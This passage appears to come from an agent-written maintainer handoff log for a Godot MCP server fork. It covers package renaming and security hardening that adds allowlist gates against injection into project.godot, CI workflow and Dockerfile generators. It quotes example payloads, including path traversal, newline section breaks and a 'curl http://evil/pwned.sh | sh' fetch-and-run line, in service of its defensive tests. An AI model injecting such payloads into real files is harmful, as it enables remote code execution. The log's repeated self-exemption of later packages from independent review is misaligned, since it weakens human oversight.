- Non-blocking: handlers pass `this.pathPolicy` so probe resolution uses the same canonical root policy as the request boundary.
- Non-blocking: project paths in advisory command text escape embedded double quotes.

The repair remains local-only and does not push, publish, create a PR/release, upload a package, write `docs/maintainers/release-candidate.md`, or send the candidate-ready notification. It must receive a fresh independent NeuralWatt review against its exact immutable commit after all gates pass.

## Verification on the repair filesystem

- Focused asset-import test: 16 tests passed.
- Full canonical gates after the repair source/test edits: `npm test` 34 files, 695 tests passed; `npm run build` passed; `npm audit --audit-level=high` reported 0 vulnerabilities; `git diff --check` passed.
- Committed repair gates: rerun after the final handoff-only edit before publication.
- Independent NeuralWatt review of exact commit `76c9207712dfc9152f809c33a8c59d7131340668`: `VERDICT | ACCEPT`; reviewer HEAD/status fingerprint unchanged. The reviewer independently confirmed `.json`/`.pck` direct-loaded regressions, canonical `PathPolicy` injection, truthful boundary comments, safe advisory quoting, scope preservation, and no amendment of `88dda1e`.
- Godot executable: unavailable on this runner (`godot`/`godot4` not found); real-Godot and Wargrid acceptance remain unproven.
- Any source, test, documentation, build/import, generated-artifact, amend, or cleanup edit after these commands invalidates the relevant evidence and requires the gates to be rerun on the final committed state.

## Next safe action

The accepted local repair is ready for the next bounded takeover package. The highest-priority remaining package is the generic headless Godot test runner with GUT adapter (#29), but the Godot binary is unavailable here; select only after fresh repository evidence and a bounded RED test. Do not push, publish, create a PR/release, upload a package, write `docs/maintainers/release-candidate.md`, or send the candidate-ready notification.

## Current package — Defkil fork package identity (release manifests)

The takeover baseline carried the immediate-upstream package identity
(`@tugcantopaloglu/godot-mcp@3.1.0`, `io.github.tugcantopaloglu/godot-mcp`,
repository pointing at `github.com/tugcantopaloglu/godot-mcp`). A Defkil
publication would have shipped under the wrong owner/namespace and
wrong bug tracker, so the release manifests are rebased to:

- npm scope: `@defkil/godot-mcp`
- version: `4.0.0`
- MCP Registry name: `io.github.Defkil/godot-mcp`
- repository: `https://github.com/Defkil/godot-mcp`
- bug tracker: `https://github.com/Defkil/godot-mcp/issues`

The change is structural for the release contract: `scripts/sync-version.js`
now propagates both name and version into `package-lock.json` (top-level
and `packages['']`) and into the npm entry of `server.json`. The
existing `version` script hook (`npm run version`) drives the same
propagation, so any future `npm version patch/minor/major` keeps the
three manifests aligned.

`LICENSE` preserves the two predecessor MIT copyright lines
(`Tugcan Topaloglu` 2025 for the 158-tool immediate upstream,
`Solomon Elias` 2025 for the 20-tool original source) and adds a
Defkil copyright line; the MIT permission grant and warranty disclaimer
are unchanged. `README.md` keeps the inherited acknowledgements and
adds a `Maintained by Defkil` line that names the package scope and
the inheritance lineage.

References to `tugcantopaloglu` and `Coding-Solo` in test files,
source comments, and `docs/maintainers/issue-inventory.md` are
**provenance links to upstream issue trackers** — they intentionally
stay so the next reviewer can recover the issue history that drove each
takeover decision. They are not ownership claims.

The package:

- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the path policy, the runtime bridge,
  the MIT attribution, and the LICENSE structure;
- does not touch `src/server.ts`, the tool registry, the capability
  policy, the request limiter, the operation runner, the GDScript
  surface, or any test fixture outside the new file;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

## Verification on the package filesystem

- `npx vitest run tests/package-identity.test.ts`: 1 file, 7 tests passed.
- `npx vitest run tests/version-sync.test.ts`: 1 file, 5 tests passed
  (regression coverage for the extended `syncVersions` contract).
- `npm test`: 35 files, 702 tests passed (was 695 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed.
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  `npm notice name: @defkil/godot-mcp`, `npm notice version: 4.0.0`,
  integrity recorded.

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- This package is a release-manifest change plus a script-extending
  test addition. The identity contract is asserted by the focused
  test file and by the existing `tests/version-sync.test.ts` (now
  including the name-propagation contract). It does not require a
  fresh NeuralWatt reviewer dispatch for the registry-tooling
  invariants; if a future real-Godot regression surfaces a
  release-coordination failure, it must satisfy the contract asserted
  in `tests/package-identity.test.ts`.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Current package — manage_layers / manage_plugins injection gate (sibling of #9)

The previous package closed the Defkil fork package identity rebase. The
handoff's next-priority items all require a Godot binary on the takeover
runner that is not present here. Instead, this package closes a real
release-readiness defect that is a sibling of [tugcantopaloglu#9]: the
`manage_autoloads` injection gate was a one-off fix, but the same class of
bug persisted in `handleManageLayers` and `handleManagePlugins`, which
constructed the layer/plugin setting line as a raw string interpolation
into `project.godot` and used lexical `validatePath` instead of the
request-boundary `PathPolicy.assertProject`. A caller could inject a
newline + section header (e.g. `"\n[autoload]\nMcpInteractionServer=\"*res://evil.gd\""`)
into the `name` (for layers) or `pluginName` (for plugins) field and
silently corrupt unrelated tables on disk. The defect is the same shape
as the recently-closed autoload gate.

The package is two focused handler edits + one new test file + one
inventory row update:

- **`src/server.ts` :: `handleManageLayers`** — three focused edits:
  - Resolves the project through `this.pathPolicy.assertProject` so the
    lexical `validatePath` boundary is replaced by the same canonical
    root enforcement that `manage_autoloads` already uses.
  - Requires `layerType` to be one of the documented enum values
    (`render_2d`, `physics_2d`, `render_3d`, `physics_3d`,
    `navigation_2d`, `navigation_3d`, `avoidance`) before any file is
    touched; rejects everything else with a typed `Invalid layerType`
    envelope.
  - Requires `layer` to be an integer in `[1, 32]`; rejects everything
    else with a typed `Invalid layer` envelope.
  - Requires `name` to match `/^[A-Za-z_][A-Za-z0-9_]*$/`; rejects
    everything else with a typed `Invalid layer name` envelope.

- **`src/server.ts` :: `handleManagePlugins`** — two focused edits:
  - Resolves the project through `this.pathPolicy.assertProject`,
    matching the `manage_autoloads` gate.
  - Requires `pluginName` to match the same strict identifier regex
    (`/^[A-Za-z_][A-Za-z0-9_]*$/`) before any file is touched; rejects
    everything else (newlines, equals signs, forward slashes, section
    brackets) with a typed `Invalid plugin name` envelope.

- **`tests/manage-layers-plugins-injection.test.ts`** (new, 11 tests) —
  exercises the real `GodotServer` + `PathPolicy` + `CapabilityPolicy`
  + MCP `tools/call` dispatch (no stubbed runner is needed; these tools
  write `project.godot` directly). Each test uses a temporary Godot
  project under the OS temp directory, removed in `afterEach`. The 11
  tests cover:
  1. `manage_layers.set` with a section-breaking newline in `name`
     rejected with typed envelope; `project.godot` byte-identical to
     pre-call.
  2. `manage_layers.set` with `name="player=evil"` rejected; file
     byte-identical.
  3. `manage_layers.set` with `layerType="autoload"` rejected (not a
     documented enum value); file byte-identical.
  4. `manage_layers.set` with `layer=0` rejected (out of `[1, 32]`
     range); file byte-identical.
  5. Benign `manage_layers.set` with `layerType="render_2d"`,
     `layer=3`, `name="PlayerLayer"` writes a well-shaped
     `layer_names/render_2d/layer_3="PlayerLayer"` line under a new
     `[layer_names]` section.
  6. `manage_layers.list` reports the parsed table without writing
     `project.godot`.
  7. `manage_plugins.enable` with a section-breaking newline in
     `pluginName` rejected; file byte-identical.
  8. `manage_plugins.enable` with a forward slash in `pluginName`
     rejected; file byte-identical.
  9. Benign `manage_plugins.enable` with `pluginName="MyPlugin"` writes
     a well-shaped `MyPlugin/enabled=true` line under a new
     `[editor_plugins]` section.
  10. Benign `manage_plugins.disable` against an existing plugin writes
      `MyPlugin/enabled=false` and leaves the surrounding section
      intact.
  11. `manage_plugins.list` reports enabled + available without
      writing `project.godot`.

- **`docs/maintainers/issue-inventory.md`** — added a new item 15 under
  "Additional defects found during takeover" describing the sibling-gate
  package, the wire-level regression summary, and the targeted files.
  Existing entries 13 and 14 stay as previously numbered.

The package:

- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does **not** touch the upstream `bridge-installer.ts`, the tool
  registry, the capability policy, the request limiter, the operation
  runner, the GDScript runtime, `handleManageShader`,
  `handleSetMainScene`, or `handleManageTranslations` (each is a
  separate, future bounded package if their sibling gate proves
  necessary);
- does not push, publish, create a PR/release, upload a package, write
  `docs/maintainers/release-candidate.md`, or send the candidate-ready
  notification.

Source evidence:

- `src/server.ts:6819-6885` (`handleManageLayers`) is gated by the
  identifier / enum / range gates and the `PathPolicy.assertProject`
  call.
- `src/server.ts:6887-6947` (`handleManagePlugins`) is gated by the
  identifier gate and the `PathPolicy.assertProject` call.
- `tests/manage-layers-plugins-injection.test.ts` is the only new
  test file.
- `docs/maintainers/issue-inventory.md` item 15 is the only docs edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-layers-plugins-injection.test.ts`: 1
  file, 11 tests passed.
- `npm test`: 36 files, 713 tests passed (was 702 before this package).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: `defkil-godot-mcp-4.0.0.tgz`, identity intact.

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge package
  `2ef0b1a`, the physics-frame `game_wait` package `aff7ca1`, the C# /
  .NET gate package `ec07f4b`, the autoload injection package `6d76606`,
  the asset-import-prerequisite package (`88dda1e` / `76c9207`), and the
  Defkil fork package identity rebase `a1cae8b` are each a focused test
  file (or test file + minimal handler edit) and do not require an
  independent NeuralWatt dispatch.
- The manage-layers / manage-plugins sibling-gate package follows the
  same minimal-handoff pattern as the autoload injection gate; it does
  not require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Current package — set_main_scene / manage_translations injection gate (sibling of #9)

The previous package closed the `manage_layers` / `manage_plugins`
sibling-gate (head commit at job creation,
`3874d8162fdca725223c9c4731e9a755d64c6d8a`). The handoff's next-priority
items all require a Godot binary on the takeover runner that is not
present here. Instead, this package closes another real release-readiness
defect of the same class as [tugcantopaloglu#9]: `handleSetMainScene`
concatenated `run/main_scene="<scenePath>"` directly into `project.godot`
via `content.replace('[application]', ...)`, and `handleManageTranslations`
`add` built `translations=PackedStringArray(..., "<resPath>")` while
`remove` constructed a `RegExp` whose pattern was built from a
user-controlled `translationPath`. A caller could pass
`scenePath = "evil.tscn\n[autoload]\nMcpInteractionServer=\"*res://evil.gd\""`
(or the equivalent `translationPath`) and silently corrupt unrelated
sections or wipe sibling translations.

The package is two focused handler edits + one new test file + one
inventory row update:

- **`src/server.ts` :: `handleSetMainScene`** — three focused edits:
  - Resolves the project through `this.pathPolicy.assertProject` so the
    lexical `validatePath` boundary is replaced by the same canonical
    root enforcement that `manage_autoloads`, `manage_layers`, and
    `manage_plugins` already use.
  - Drops the legacy auto-prepend shortcut
    (`args.scenePath.startsWith('res://') ? args.scenePath : 'res://' + ...`)
    in favor of strict canonical input, matching the sibling gates'
    contract.
  - Requires `scenePath` to match
    `/^res:\/\/(?!\.\.)(?!.*\.\.)[A-Za-z0-9_\-\/]+\.[A-Za-z0-9]+$/` —
    enforces `res://` prefix, no leading-dot segment, no embedded
    `..` segment, canonical project-member characters only, and at least
    one extension character. A caller that violates any rule gets a
    typed `Invalid scenePath` envelope BEFORE any file is written.

- **`src/server.ts` :: `handleManageTranslations`** — same canonical
  shape:
  - Resolves the project through `this.pathPolicy.assertProject`,
    replacing the lexical `validatePath` boundary.
  - Both `add` and `remove` apply the identical
    `translationPathRegex` to `translationPath` BEFORE the file is
    touched, with the same rejection envelope.
  - `remove`'s regex escape remains in place (`[..\]\\]` etc.) — the
    new gate runs first so a malicious `translationPath` can never
    reach the existing regex.
  - `list` is unchanged (still returns the parsed table without
    writing `project.godot`).

- **`tests/set-main-scene-translations-injection.test.ts`** (new,
  14 tests) — exercises the real `GodotServer` + `PathPolicy` +
  `CapabilityPolicy` + MCP `tools/call` dispatch (no stubbed runner
  needed; these tools write `project.godot` directly). Each test uses
  a temporary Godot project under the OS temp directory, removed in
  `afterEach`. The 14 tests cover:
  1. `set_main_scene` with a section-breaking newline in `scenePath`
     rejected; file byte-identical to pre-call snapshot.
  2. `set_main_scene` with a double-quote break-out rejected; file
     byte-identical.
  3. `set_main_scene` with `scenePath` lacking the `res://` prefix
     rejected; file byte-identical.
  4. `set_main_scene` with `scenePath = "res://../etc/passwd"` rejected
     as a project-root escape; file byte-identical.
  5. `set_main_scene` with an opening-bracket section break rejected;
     file byte-identical.
  6. Benign `set_main_scene` with `scenePath = "res://scenes/main.tscn"`
     writes a well-shaped `run/main_scene="res://scenes/main.tscn"`
     line under `[application]`.
  7. `set_main_scene` replaces an existing `run/main_scene` line and
     preserves a sibling `[autoload]` entry untouched.
  8. `manage_translations` `add` with a section-breaking newline in
     `translationPath` rejected; file byte-identical.
  9. `manage_translations` `add` with `translationPath` lacking
     `res://` rejected; file byte-identical.
  10. `manage_translations` `add` with `res://../etc/passwd` rejected;
      file byte-identical.
  11. `manage_translations` `remove` with `translationPath` lacking
      `res://` rejected; file byte-identical.
  12. Benign `manage_translations` `add` with
      `translationPath = "res://locales/en.csv"` writes a canonical
      `translations=PackedStringArray("res://locales/en.csv")` line
      under a new `[internationalization]` section.
  13. Benign `manage_translations` `remove` strips exactly one matching
      `"res://locales/en.csv"` line and leaves the sibling
      `"res://locales/de.csv"` translation untouched.
  14. `manage_translations` `list` reports the parsed translations
      array without writing `project.godot`.

- **`docs/maintainers/issue-inventory.md`** — added a new item 16
  under "Additional defects found during takeover" describing the
  sibling-gate package, the wire-level regression summary, the
  dropped auto-prepend contract tightening, and the targeted files.
  Existing entries 13-15 stay as previously numbered.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner, the
  BridgeClient, the upstream `bridge-installer.ts`, the
  `manage_autoloads` / `manage_layers` / `manage_plugins` handlers,
  `handleManageShader` (a separate, lower-priority package), or any
  other test/source;
- the only documented contract change is the dropped auto-prepend
  shortcut on `set_main_scene` and `manage_translations` (caller must
  supply canonical `res://...`) — matching the sibling
  `manage_autoloads` / `manage_layers` / `manage_plugins` gates;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/server.ts:6987-7018` (`handleSetMainScene`) is gated by the
  identifier / canonical `res://` gate and the `PathPolicy.assertProject`
  call.
- `src/server.ts:7028-7086` (`handleManageTranslations`) is gated by
  the same canonical `res://` gate on `translationPath` (both
  branches) and `PathPolicy.assertProject`.
- `tests/set-main-scene-translations-injection.test.ts` is the only
  new test file.
- `docs/maintainers/issue-inventory.md` item 16 is the only docs
  edit.

## Verification on the package filesystem

- `npx vitest run tests/set-main-scene-translations-injection.test.ts`:
  1 file, 14 tests passed (RED 7/14 confirmed before the fix; GREEN
  14/14 after).
- `npm test`: 37 files, 727 tests passed (was 713 before this
  package; +14 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, and the manage-layers / manage-plugins
  sibling-gate package `3874d81` are each a focused test file (or
  test file + minimal handler edit) and do not require an independent
  NeuralWatt dispatch.
- The set-main-scene / manage-translations sibling-gate package
  (this package) is two minimal handler edits + one new test file +
  one inventory row update. It follows the exact same minimal-handoff
  pattern as items 14 and 15 and does not require an independent
  NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Open inventory priorities

1. Generic headless Godot test runner with GUT adapter (#29).
2. Real-Godot verification of the `attach_script` C# / .NET round-trip
   (`tests/attach-script-dotnet-gate.test.ts`).
3. Real Godot reconnect verification for the wired `BridgeClient`
   (#84 follow-up).
4. Real-Godot verification of the round-trip contract
   (`tests/scene-round-trip.test.ts`).
5. Real-Godot verification of the tween-vector regression
   (`tests/tween-vector-bridge.test.ts`).
6. Real-Godot verification of the physics-frame `game_wait` regression
   (`tests/game-wait-frame-bridge.test.ts`).
7. Real-Godot verification of the asset import prerequisite
   (`tests/asset-import-prerequisite.test.ts`).
8. Real-Godot verification of the `manage_ci_pipeline` /
   `manage_docker_export` template round-trip — the generated YAML
   and Dockerfile must remain parseable / executable under a real
   Godot / Docker / GitHub Actions runner that doesn't share the
   takeover runner's assumptions (`tests/manage-ci-pipeline-injection.test.ts`
   and `tests/manage-docker-export-injection.test.ts` are wire-level
   contract only).
9. Final read/test-only Wargrid integration acceptance after every
   local release gate.

## Current package — manage_shader injection gate (sibling of tugcantopaloglu#9)

The handoff previously listed `manage_shader` minimal hardening as the
next bounded package. The package closes the same wire contract the
sibling `set_main_scene` / `manage_translations` / `manage_layers` /
`manage_plugins` / `manage_autoloads` gates already hold.

`handleManageShader` historically joined `args.shaderPath` onto
`args.projectPath`, gated only by the lexical `validatePath` boundary
on both inputs, and `mkdirSync`ed the user-named parent directory
before writing the shader source. A caller could smuggle a
section-breaking newline (`shaderPath = "evil.gdshader\n..."`), a
relative member lacking `res://` (`shaderPath = "shaders/spatial.gdshader"`),
an inside-segment `..` traversal (`shaderPath = "sub/../etc/passwd"`),
or any unknown `action` and still observe a successful write/read or
silently corrupt neighbouring files.

The gate is now:

1. An explicit `action` allowlist (`read` | `create`) BEFORE any
   filesystem call.
2. A canonical `res://` + canonical-project-member regex
   (`/^res:\/\/(?!\.\.)(?!.*\.\.)[A-Za-z0-9_\-\/]+\.[A-Za-z0-9]+$/`)
   matching the sibling `scenePathRegex` / `translationPathRegex`
   shape; the legacy auto-prepend shortcut is intentionally dropped
   (callers MUST supply `res://shaders/foo.gdshader`), exactly as the
   `set_main_scene` / `manage_translations` contract change.
3. `this.pathPolicy.assertProject(args.projectPath)` replaces the
   lexical `validatePath` boundary on `projectPath`.
4. `this.pathPolicy.resolveProjectMember(projectRoot, args.shaderPath)`
   resolves the shader to its canonical absolute path WITHIN the
   project root, providing defence-in-depth on the `..` escape even if
   the regex is bypassed by a future change.

The wire-level regression in `tests/manage-shader-injection.test.ts`
(8 tests) drives the real MCP `tools/call` handler for `manage_shader`
against a temporary Godot project (cleaned in `afterEach`) and stubs
nothing relevant to the gate: section-breaking newline rejected,
double-quote break-out rejected, `shaderPath` lacking `res://`
rejected, `..` escape rejected via the path policy, unknown `action`
rejected without touching the filesystem, benign `read` of an existing
`res://` shader returns the source, benign `create` writes a single
`.gdshader` file under the named directory and does not touch
`project.godot`, benign `read` of a missing `res://` shader returns
the not-found envelope.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the path
  policy, the runtime bridge, and the MIT attribution;
- the only documented contract change is the dropped auto-prepend
  shortcut on `shaderPath` (caller must supply canonical
  `res://...`) — matching the sibling
  `manage_autoloads` / `manage_layers` / `manage_plugins` /
  `set_main_scene` / `manage_translations` gates;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/server.ts:6949-6997` (`handleManageShader`) is gated by the
  action allowlist, the canonical `res://` regex,
  `PathPolicy.assertProject`, and `PathPolicy.resolveProjectMember`.
- `tests/manage-shader-injection.test.ts` is the only new test file
  (8 tests).
- `docs/maintainers/issue-inventory.md` row 17 is the only docs edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-shader-injection.test.ts`:
  1 file, 8 tests passed (RED 4/8 confirmed before the fix;
  GREEN 8/8 after — the `..` escape and unknown action branches were
  already partially shielded by `validatePath` and the runtime
  switch fallback, but lacked the typed-envelope shape the sibling
  gates use).
- `npm test`: 38 files, 735 tests passed (was 727 before this
  package; +8 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, and the
  manage_shader sibling-gate package (this package) are each a
  focused test file (or test file + minimal handler edit) and do
  not require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The next bounded package is a focused test addition / minimal
sibling hardening for `manage_ci_pipeline` and `manage_docker_export`
(now that the `project.godot` injection surface and the
`res://` canonical-member contract are both well-established in the
sibling-handler pattern). The starting evidence is the absence of a
`manage-ci-pipeline-injection.test.ts` / `manage-docker-export-injection.test.ts`
regression and the same lexical-vs-`PathPolicy` shape the other
sibling gates use. Mirror the `manage_layers` / `manage_plugins`
sibling-gate pattern; land without a Godot binary. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the
candidate-ready notification.

## Current package — manage_ci_pipeline / manage_docker_export injection gates (sibling of tugcantopaloglu#9)

The handoff previously listed `manage_ci_pipeline` and
`manage_docker_export` minimal hardening as the next bounded package.
The package closes the same wire contract the sibling
`manage_autoloads` / `manage_layers` / `manage_plugins` /
`set_main_scene` / `manage_translations` / `manage_shader` gates
already hold, but with a different threat surface: instead of writing
into `project.godot`, both handlers interpolate caller-supplied
template values directly into shell commands that execute on every CI
build and at every container runtime.

`handleManageCiPipeline` historically concatenated
`godotVersion` into `mkdir -p ... /godot/export_templates/${godotVersion}`
and `mv ... /godot/export_templates/${godotVersion}/*` shell commands
inside the generated `.github/workflows/godot-export.yml`, and
`platforms` into `godot --export-release "${p}"` shell steps. A caller
could pass `godotVersion = "4.3-stable\nrun: |\n  echo PWNED > /tmp/pwned\n"`
to break out of the YAML and inject arbitrary GitHub Actions steps, or
`platforms = ['linux"\n  - run: echo PWNED']` to inject arbitrary
shell, and the lexical `validatePath` boundary on `projectPath` only
rejected empty / `..`-bearing strings (letting newlines / quotes /
brackets through).

`handleManageDockerExport` historically concatenated `godotVersion`
into shell `wget` URLs and `mv templates/* .../export_templates/${godotVersion}/`
commands inside the generated `Dockerfile`, `baseImage` into the
`FROM ${baseImage}` directive, and `exportPreset` into the runtime
`CMD ["godot", ..., "${exportPreset}", ...]` shell command. A caller
could pass `baseImage = "ubuntu:22.04\nRUN curl http://evil/pwned.sh | sh\n"`
to inject arbitrary Dockerfile instructions, `exportPreset = 'Linux/X11"\nRUN curl http://evil/pwned.sh | sh\n'`
to inject arbitrary Dockerfile content, and the same lexical
`validatePath` boundary on `projectPath` was the only defense.

The gate is now, for both handlers:

1. An explicit `action` allowlist (`read` | `create`) BEFORE any
   filesystem call.
2. `this.pathPolicy.assertProject(args.projectPath)` replaces the
   lexical `validatePath` boundary, matching every sibling gate.
3. A strict Godot release-tag allowlist
   (`/^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-z0-9]+)?$/`) on `godotVersion` —
   callers MUST supply a literal release tag like `4.3-stable` or
   `4.4.1-rc1`. A bare `4.3` or `4.4.1` is also accepted.
4. For `manage_ci_pipeline`: a closed-list platforms allowlist
   (`linux` | `windows` | `macos` | `web` | `android` | `ios`) on each
   `platforms[]` entry — the documented Godot export platforms.
5. For `manage_docker_export`: a Docker image-reference allowlist
   (`/^[a-z0-9]+([._-][a-z0-9]+)*(:[a-z0-9._-]+)?$/`) on `baseImage`
   — accepts `ubuntu:22.04`, `debian:12-slim`, `alpine`, but rejects
   newlines, quotes, brackets, and `RUN` directives.
6. For `manage_docker_export`: a Godot export-preset name allowlist
   (`/^[A-Za-z0-9 _.\-/]+$/`) on `exportPreset` — accepts `Linux/X11`,
   `Windows Desktop`, `macOS`, etc., but rejects newlines, quotes,
   brackets, and `;`.

The wire-level regression in
`tests/manage-ci-pipeline-injection.test.ts` (8 tests) drives the
real MCP `tools/call` handler for `manage_ci_pipeline` against a
temporary Godot project (cleaned in `afterEach`) and stubs nothing
relevant to the gate: section-breaking newline in `godotVersion`
rejected, shell backtick in `godotVersion` rejected, double-quote
break-out in `godotVersion` rejected, shell break-out in `platforms[]`
rejected, unknown `action` rejected without touching the filesystem,
benign `create` writes a single well-shaped workflow file and does
not touch `project.godot`, benign `read` of an existing workflow
returns the source, benign `read` of a missing workflow returns the
not-found envelope.

The wire-level regression in
`tests/manage-docker-export-injection.test.ts` (9 tests) drives the
real MCP `tools/call` handler for `manage_docker_export` against a
temporary Godot project: section-breaking newline in `godotVersion`
rejected, shell backtick in `godotVersion` rejected, Dockerfile
directive break-out in `baseImage` rejected, shell break-out in
`exportPreset` rejected, unknown `action` rejected without touching
the filesystem, benign `create` with default values writes a single
well-shaped Dockerfile and does not touch `project.godot`, benign
`create` with custom valid version and base image writes the
documented file, benign `read` of an existing Dockerfile returns the
source, benign `read` of a missing Dockerfile returns the not-found
envelope.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the path
  policy, the runtime bridge, and the MIT attribution;
- the only documented contract changes are the strict value gates on
  `godotVersion` / `platforms` / `baseImage` / `exportPreset`
  (callers MUST supply a documented value matching the documented
  allowlist) — matching the strict-input contract the
  `manage_autoloads` / `manage_layers` / `manage_plugins` /
  `set_main_scene` / `manage_translations` / `manage_shader` sibling
  gates already enforce;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/server.ts:7300-7364` (`handleManageCiPipeline`) is gated by
  the action allowlist, the canonical-root `PathPolicy.assertProject`,
  the strict Godot release-tag allowlist on `godotVersion`, and the
  closed-list platforms allowlist on each `platforms[]` entry.
- `src/server.ts:7365-7430` (`handleManageDockerExport`) is gated by
  the action allowlist, the canonical-root `PathPolicy.assertProject`,
  the strict Godot release-tag allowlist on `godotVersion`, the
  Docker image-reference allowlist on `baseImage`, and the Godot
  export-preset name allowlist on `exportPreset`.
- `tests/manage-ci-pipeline-injection.test.ts` is the only new test
  file for `manage_ci_pipeline` (8 tests).
- `tests/manage-docker-export-injection.test.ts` is the only new test
  file for `manage_docker_export` (9 tests).
- `docs/maintainers/issue-inventory.md` row 18 is the only docs edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-ci-pipeline-injection.test.ts`:
  1 file, 8 tests passed (RED 4/8 confirmed before the fix;
  GREEN 8/8 after — the `..` escape and unknown action branches were
  already partially shielded by `validatePath` and the runtime
  switch fallback, but lacked the typed-envelope shape the sibling
  gates use).
- `npx vitest run tests/manage-docker-export-injection.test.ts`:
  1 file, 9 tests passed (RED 4/9 confirmed before the fix;
  GREEN 9/9 after — same rationale as above).
- `npm test`: 40 files, 752 tests passed (was 735 before this
  package; +17 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
